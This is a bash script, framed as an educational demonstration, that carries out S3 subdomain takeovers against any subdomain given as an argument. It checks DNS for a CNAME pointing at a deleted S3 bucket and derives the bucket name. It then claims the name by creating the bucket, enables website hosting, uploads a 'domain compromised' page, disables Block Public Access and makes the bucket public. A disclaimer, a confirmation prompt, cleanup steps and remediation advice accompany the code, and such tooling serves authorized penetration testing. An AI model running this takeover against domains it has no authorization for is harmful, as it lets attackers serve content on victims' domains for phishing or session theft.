#!/bin/bash

################################################################################
# S3 Subdomain Takeover Demonstration Script
#
# Educational tool to demonstrate how attackers exploit missing DNS cleanup
# when S3 buckets are deleted. This simulates a common subdomain takeover attack.
#
# Usage: ./s3-subdomain-takeover.sh <subdomain> [--take-over] [--cleanup] [--region REGION]
#
# Example:
#   ./s3-subdomain-takeover.sh assets.example.com --analyze
#   ./s3-subdomain-takeover.sh assets.example.com --take-over
#   ./s3-subdomain-takeover.sh assets.example.com --cleanup
#
# ⚠️  DISCLAIMER:
# This script is for AUTHORIZED security testing and educational purposes ONLY.
# Unauthorized access to computer systems is illegal. Only use on domains/systems
# you own or have explicit written permission to test.
################################################################################

set -e

# Color codes for output (only if terminal supports it)
if [[ -t 1 ]]; then
    RED='\033[0;31m'
    GREEN='\033[0;32m'
    YELLOW='\033[1;33m'
    BLUE='\033[0;34m'
    NC='\033[0m'
else
    RED=''
    GREEN=''
    YELLOW=''
    BLUE=''
    NC=''
fi

# Configuration
AWS_REGION="${AWS_REGION:-us-east-1}"
VERBOSE=false
ANALYZE_ONLY=false
TAKE_OVER=false
CLEANUP=false

# Functions
print_banner() {
    cat << 'EOF'
╔══════════════════════════════════════════════════════════════════════════════╗
║                  S3 Subdomain Takeover Demo Tool                             ║
║            Educational Tool for AWS Security Vulnerability Labs             ║
╚══════════════════════════════════════════════════════════════════════════════╝
EOF
}

print_warning() {
    echo -e "${RED}⚠️  WARNING: ${NC}$1"
}

print_info() {
    echo -e "${BLUE}ℹ️  INFO:${NC} $1"
}

print_success() {
    echo -e "${GREEN}✓${NC} $1"
}

print_error() {
    echo -e "${RED}✗${NC} $1"
}

usage() {
    cat << 'EOF'
Usage: ./s3-subdomain-takeover.sh <subdomain> [OPTIONS]

Positional Arguments:
  <subdomain>              Target subdomain (e.g., assets.example.com)

Options:
  --analyze                Analyze subdomain for vulnerability (default)
  --take-over              Attempt subdomain takeover by creating S3 bucket
  --cleanup                Remove the S3 bucket (undo takeover)
  --region REGION          AWS region (default: us-east-1)
  --verbose                Enable verbose output
  -h, --help               Show this help message

Examples:
  # Analyze if a subdomain is vulnerable
  ./s3-subdomain-takeover.sh assets.example.com --analyze

  # Perform the takeover (create S3 bucket)
  ./s3-subdomain-takeover.sh assets.example.com --take-over

  # Clean up after takeover
  ./s3-subdomain-takeover.sh assets.example.com --cleanup

DISCLAIMER:
  This tool is for AUTHORIZED testing only. Unauthorized system access is illegal.
  Ensure you have explicit permission before testing any domain.
EOF
    exit 1
}

parse_arguments() {
    if [[ $# -lt 1 ]]; then
        usage
    fi

    SUBDOMAIN="$1"
    shift

    while [[ $# -gt 0 ]]; do
        case "$1" in
            --analyze)
                ANALYZE_ONLY=true
                ;;
            --take-over)
                TAKE_OVER=true
                ;;
            --cleanup)
                CLEANUP=true
                ;;
            --region)
                AWS_REGION="$2"
                shift
                ;;
            --verbose)
                VERBOSE=true
                ;;
            -h|--help)
                usage
                ;;
            *)
                print_error "Unknown option: $1"
                usage
                ;;
        esac
        shift
    done
}

check_prerequisites() {
    print_info "Checking prerequisites..."

    # Check AWS CLI
    if ! command -v aws &> /dev/null; then
        print_error "AWS CLI not found. Install it first: https://aws.amazon.com/cli/"
        exit 1
    fi

    # Check dig or nslookup
    if ! command -v dig &> /dev/null; then
        print_warning "dig not found. Installing dnsutils (macOS: brew install bind, Linux: apt-get install dnsutils)"
        if [[ "$OSTYPE" == "darwin"* ]]; then
            # macOS - suggest homebrew
            print_info "On macOS, run: brew install bind"
        fi
    fi

    # Check AWS credentials
    if ! aws sts get-caller-identity &> /dev/null; then
        print_error "AWS credentials not configured. Run: aws configure"
        exit 1
    fi

    print_success "Prerequisites met"
}

analyze_subdomain() {
    print_info "Analyzing subdomain: ${BLUE}$SUBDOMAIN${NC}"
    echo

    # Step 1: DNS Lookup
    print_info "Step 1: Checking DNS records..."

    if command -v dig &> /dev/null; then
        CNAME_RESULT=$(dig +short CNAME "$SUBDOMAIN" 2>/dev/null || echo "")
    else
        CNAME_RESULT=$(nslookup -querytype=CNAME "$SUBDOMAIN" 2>/dev/null | grep "canonical name" || echo "")
    fi

    if [[ -z "$CNAME_RESULT" ]]; then
        print_error "No CNAME record found for $SUBDOMAIN"
        echo "  The subdomain doesn't have a DNS CNAME entry pointing to S3"
        return 1
    fi

    print_success "CNAME record found: ${YELLOW}$CNAME_RESULT${NC}"

    # Step 2: Check if CNAME points to S3
    if [[ "$CNAME_RESULT" == *"s3"* ]] || [[ "$CNAME_RESULT" == *"amazonaws.com"* ]]; then
        print_success "CNAME points to AWS S3 bucket"
    else
        print_error "CNAME does not point to S3: $CNAME_RESULT"
        return 1
    fi

    # Step 3: Extract bucket name
    print_info "Step 2: Deriving bucket name from CNAME..."

    # Extract bucket name from CNAME (e.g., assets.example.com.s3.amazonaws.com -> assets.example.com)
    if [[ "$CNAME_RESULT" == *.s3*.amazonaws.com* ]]; then
        BUCKET_NAME=$(echo "$CNAME_RESULT" | sed 's/\.s3[.-].*\.amazonaws\.com//')
    else
        BUCKET_NAME="$SUBDOMAIN"
    fi

    # Remove trailing dots (DNS responses include them, but S3 bucket names can't)
    BUCKET_NAME="${BUCKET_NAME%.}"

    print_success "Derived bucket name: ${YELLOW}$BUCKET_NAME${NC}"

    # Step 4: Check if bucket exists
    print_info "Step 3: Checking if S3 bucket exists..."

    if aws s3 ls "s3://$BUCKET_NAME" --region "$AWS_REGION" &> /dev/null; then
        print_error "Bucket ${RED}exists${NC} and is accessible - not vulnerable (or you don't have access)"
        return 1
    else
        print_success "Bucket does ${GREEN}NOT exist${NC} - VULNERABLE!"
        echo
        echo -e "${GREEN}╔════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${GREEN}║           SUBDOMAIN TAKEOVER VULNERABILITY FOUND            ║${NC}"
        echo -e "${GREEN}╚════════════════════════════════════════════════════════════╝${NC}"
        echo
        echo -e "Vulnerable Domain: ${YELLOW}$SUBDOMAIN${NC}"
        echo -e "CNAME Target:      ${YELLOW}$CNAME_RESULT${NC}"
        echo -e "Bucket Name:       ${YELLOW}$BUCKET_NAME${NC}"
        echo -e "AWS Region:        ${YELLOW}$AWS_REGION${NC}"
        echo
        echo "Attack Path:"
        echo "  1. S3 bucket '$BUCKET_NAME' was deleted but DNS CNAME still exists"
        echo "  2. Attacker can create a new bucket with the same name"
        echo "  3. Configure bucket for static website hosting"
        echo "  4. The subdomain now points to the attacker's bucket"
        echo
        return 0
    fi
}

take_over_subdomain() {
    print_warning "Attempting subdomain takeover..."
    echo

    # Re-analyze to get bucket name
    if ! analyze_subdomain; then
        print_error "Subdomain analysis failed"
        return 1
    fi

    echo
    read -p "Continue with takeover of $SUBDOMAIN? (type 'yes' to confirm): " CONFIRM
    if [[ "$CONFIRM" != "yes" ]]; then
        print_info "Takeover cancelled"
        return 0
    fi

    # Step 1: Create bucket
    print_info "Creating S3 bucket: $BUCKET_NAME in region $AWS_REGION..."

    if [[ "$AWS_REGION" == "us-east-1" ]]; then
        aws s3api create-bucket \
            --bucket "$BUCKET_NAME" \
            --region "$AWS_REGION" \
            2>&1 || {
                print_error "Failed to create bucket. It may already exist or be reserved."
                return 1
            }
    else
        aws s3api create-bucket \
            --bucket "$BUCKET_NAME" \
            --region "$AWS_REGION" \
            --create-bucket-configuration LocationConstraint="$AWS_REGION" \
            2>&1 || {
                print_error "Failed to create bucket. It may already exist or be reserved."
                return 1
            }
    fi

    print_success "Bucket created successfully"

    # Step 2: Enable static website hosting
    print_info "Configuring bucket for static website hosting..."

    cat > /tmp/website-config.json << 'EOF'
{
  "IndexDocument": {"Suffix": "index.html"},
  "ErrorDocument": {"Key": "error.html"}
}
EOF

    aws s3api put-bucket-website \
        --bucket "$BUCKET_NAME" \
        --website-configuration file:///tmp/website-config.json \
        --region "$AWS_REGION"

    rm -f /tmp/website-config.json

    print_success "Static website hosting enabled"

    # Step 3: Create proof-of-concept content
    print_info "Uploading proof-of-concept content..."

    cat > /tmp/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
    <title>Subdomain Takeover - Proof of Concept</title>
    <style>
        body { font-family: Arial, sans-serif; background: #f5f5f5; }
        .container { max-width: 800px; margin: 50px auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        .alert { background: #ffe6e6; border-left: 4px solid #ff0000; padding: 15px; margin-bottom: 20px; }
        h1 { color: #333; }
        code { background: #f0f0f0; padding: 2px 6px; border-radius: 3px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="alert">
            <strong>⚠️ Subdomain Takeover Detected</strong>
        </div>
        <h1>This domain has been compromised</h1>
        <p>A successful subdomain takeover attack has occurred.</p>
        <h2>What happened?</h2>
        <ol>
            <li>The original S3 bucket for this subdomain was deleted</li>
            <li>The DNS CNAME record was not cleaned up</li>
            <li>An attacker created a new S3 bucket with the same name</li>
            <li>The subdomain now points to the attacker's bucket</li>
        </ol>
        <h2>How to fix</h2>
        <p>Remove the CNAME DNS record for this subdomain, or ensure the S3 bucket remains active and secure.</p>
    </div>
</body>
</html>
EOF

    aws s3 cp /tmp/index.html "s3://$BUCKET_NAME/index.html" --region "$AWS_REGION"
    rm -f /tmp/index.html

    print_success "Content uploaded"

    # Step 4: Disable Block Public Access (required for public bucket policy)
    print_info "Disabling S3 Block Public Access settings..."

    aws s3api put-public-access-block \
        --bucket "$BUCKET_NAME" \
        --public-access-block-configuration \
        "BlockPublicAcls=false,IgnorePublicAcls=false,BlockPublicPolicy=false,RestrictPublicBuckets=false" \
        --region "$AWS_REGION"

    print_success "Block Public Access disabled"

    # Step 5: Make bucket publicly readable
    print_info "Applying public bucket policy..."

    cat > /tmp/bucket-policy.json << EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "PublicRead",
      "Effect": "Allow",
      "Principal": "*",
      "Action": "s3:GetObject",
      "Resource": "arn:aws:s3:::$BUCKET_NAME/*"
    }
  ]
}
EOF

    aws s3api put-bucket-policy \
        --bucket "$BUCKET_NAME" \
        --policy file:///tmp/bucket-policy.json \
        --region "$AWS_REGION"

    rm -f /tmp/bucket-policy.json

    print_success "Public access policy applied"

    # Step 6: Display takeover info
    echo
    echo -e "${GREEN}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║        SUBDOMAIN TAKEOVER SUCCESSFUL                       ║${NC}"
    echo -e "${GREEN}╚════════════════════════════════════════════════════════════╝${NC}"
    echo
    echo "Takeover Details:"
    echo -e "  Subdomain:        ${YELLOW}$SUBDOMAIN${NC}"
    echo -e "  Bucket Name:      ${YELLOW}$BUCKET_NAME${NC}"
    echo -e "  Region:           ${YELLOW}$AWS_REGION${NC}"
    echo -e "  Website URL:      ${YELLOW}http://$BUCKET_NAME.s3-website-$AWS_REGION.amazonaws.com${NC}"
    echo
    echo "The subdomain $SUBDOMAIN now resolves to the attacker's S3 bucket."
    echo
}

cleanup_takeover() {
    print_info "Cleaning up subdomain takeover..."

    # Re-analyze to get bucket name
    if ! analyze_subdomain; then
        read -p "Enter bucket name to clean up: " BUCKET_NAME
    fi

    echo
    read -p "Delete bucket '$BUCKET_NAME'? (type 'yes' to confirm): " CONFIRM
    if [[ "$CONFIRM" != "yes" ]]; then
        print_info "Cleanup cancelled"
        return 0
    fi

    # Empty the bucket first
    print_info "Emptying bucket..."
    aws s3 rm "s3://$BUCKET_NAME" --recursive --region "$AWS_REGION" 2>/dev/null || true

    # Delete the bucket
    print_info "Deleting bucket..."
    aws s3api delete-bucket \
        --bucket "$BUCKET_NAME" \
        --region "$AWS_REGION" 2>/dev/null || {
            print_error "Failed to delete bucket"
            return 1
        }

    print_success "Bucket deleted successfully"
    echo
    echo "To fully remediate the vulnerability:"
    echo "  1. Remove the CNAME DNS record for $SUBDOMAIN"
    echo "  2. Verify the subdomain no longer resolves"
}

main() {
    print_banner
    echo

    parse_arguments "$@"

    check_prerequisites
    echo

    if [[ "$TAKE_OVER" == true ]]; then
        take_over_subdomain
    elif [[ "$CLEANUP" == true ]]; then
        cleanup_takeover
    else
        # Default: analyze only
        analyze_subdomain
    fi
}

# Run main function
main "$@"
